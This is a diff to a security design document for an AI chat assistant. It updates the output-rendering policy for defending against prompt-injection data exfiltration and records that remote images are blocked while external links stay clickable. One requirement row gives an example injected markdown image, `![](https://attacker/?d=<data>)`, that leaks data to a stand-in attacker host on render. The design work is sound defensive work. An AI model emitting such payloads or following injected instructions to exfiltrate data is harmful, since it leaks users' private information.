@@ -44,7 +44,7 @@ This document builds on working code, not a greenfield design. An honest invento
 | Audit log | `services/chatActions/auditLog.ts` | Structured success/rejection logging to CloudWatch. Not surfaced in UI. |
 | Registered actions | `createTaskAction.ts`, `submitGithubIssueAction.ts` | Two. `create_task` correctly re-uses `createTaskSchema` from the HTTP route. |
 | Cost cap | `services/chatbotCostTracker.ts` | $20/mo, mutex-guarded, already segmented **per workspace**. |
-| Output rendering | frontend chat components | Plain text. No markdown renderer, no `dangerouslySetInnerHTML`. |
+| Output rendering | `frontend/src/components/chat/ChatMessageBubble.tsx` | Markdown via `react-markdown` + `remark-gfm`, behind a narrowed `rehype-sanitize` allowlist (TD-015). `img` is **not** allowlisted, so remote images are already blocked. External `http`/`https` links **are** clickable — see §7.3. |
 
 The last row matters more than it looks — see §7.3.
 
@@ -272,14 +272,19 @@ Because two legs are structural, **the entire injection defense rests on the thi
 
 ### 7.3 Output Rendering Policy — Load-Bearing Invariant
 
-The frontend currently renders chat output as **plain text**. There is no markdown renderer and no `dangerouslySetInnerHTML` anywhere in the chat components. The exfiltration leg is therefore closed today — but **by accident, not by policy**. Someone will add markdown rendering for an entirely good reason and silently open it.
+Assistant output is rendered as markdown (`react-markdown` + `remark-gfm`) behind a deliberately narrowed `rehype-sanitize` allowlist, hardened under TD-015. Measured against the requirements below, the current state is **mostly compliant**:
+
+- **SEC-P023 is already satisfied.** `img` is absent from the allowlist, so the silent-exfiltration primitive is closed — and closed by design, not by accident.
+- **SEC-P024 is not satisfied.** `protocols: { href: ['http', 'https', 'mailto'] }` makes external links clickable today.
+
+The gap is real but lower severity than an image: an anchor requires a deliberate user click, whereas an image fetches on render. It is tracked as Q-P06 rather than treated as an incident.
 
 | ID | Requirement |
 |----|-------------|
 | SEC-P022 | Same-origin internal application links are permitted and clickable. Action-card resource links (e.g. `/tasks?taskId=…`) are the canonical form. |
 | SEC-P023 | **Remote images are prohibited without exception.** An image fetches automatically with no user interaction, making it the highest-severity exfiltration primitive: an injected `![](https://attacker/?d=<data>)` leaks silently on render. |
-| SEC-P024 | External URLs appearing in model output must render as inert, non-clickable text. |
-| SEC-P025 | An automated test must assert this invariant and fail if a markdown or HTML renderer is introduced into the chat render path. The test is the control; the policy alone will not survive contact with a future feature. |
+| SEC-P024 | External URLs appearing in model output must render as inert, non-clickable text. **Not currently enforced** — see Q-P06. |
+| SEC-P025 | An automated test must assert this invariant and fail if the renderer is swapped, the sanitizer dropped, or the allowlist widened. The test is the control; the policy alone will not survive contact with a future feature. **Implemented:** `frontend/src/components/chat/ChatMessageBubble.security.test.tsx`, verified by mutation. |
 | SEC-P026 | Any future request to render remote imagery (e.g. place photos in trip planning) must route through the existing server-side proxy pattern with a host allowlist, and must be specified as an amendment to this section rather than implemented ad hoc. |
 
 **Accepted cost:** the agent cannot hand the user a clickable restaurant link while planning a trip. A URL rendered as copyable text is mildly annoying and leaks nothing. **(D-P03)**
@@ -416,7 +421,7 @@ Diagnosis after the fact is only possible if the evidence was captured at the ti
 
 | Phase | Scope | Exit criteria |
 |-------|-------|---------------|
-| **0 — Correctness** | Fix `get_budgets` (returns no actuals despite its description; returns bare IDs; absent budgets indistinguishable from no lookup). Add the §7.3 rendering-invariant test. | The Subaru-class failure is reproducible before and absent after. |
+| **0 — Correctness** | Fix `get_budgets` (returns no actuals despite its description; returns bare IDs; absent budgets indistinguishable from no lookup). Add the §7.3 rendering-invariant test. | **Done.** The Subaru-class failure is covered by regression tests; the rendering invariant is locked and mutation-verified. |
 | **1 — Foundations** | Tier + dataClass in the registry; tool definitions derived from it; plan cards with per-row toggles; split cost caps; structured trace (§10.1). | Existing two actions run unchanged on the new machinery. |
 | **2 — Read coverage** | Task, trip, and project read tools. | The assistant can answer "what's on our plate this weekend?" |
 | **3 — Confirmed writes** | T1 action set per §9. | Multi-step plan cards work end to end. |
@@ -452,6 +457,7 @@ Phase 4 gates Phase 5 deliberately: SEC-P001 (one-click reversibility) is unenfo
 | Q-P03 | Does the plan-card legibility threshold (25 rows) hold in practice on mobile? | Validate during Phase 3 with a real 40-row recategorization. |
 | Q-P04 | Should T2 automations run on a schedule, or on data arrival (post-Plaid-sync)? | On data arrival — it bounds volume to what actually changed and makes idempotency natural. |
 | Q-P05 | Where does the trace/incident store live given the JSON-file storage model? | Per-family JSON alongside existing collections, with its own retention sweep. |
+| Q-P06 | External links are clickable today (`protocols.href` allows http/https), which SEC-P024 forbids. Enforce it, or amend SEC-P024? | Undecided. Enforcing costs the ability to cite a restaurant or bank URL in trip and budget conversations; amending accepts a click-gated exfiltration path. Decide before Trips read tools ship in Phase 2, since that is when external URLs start appearing in output. |
 
 ---
 
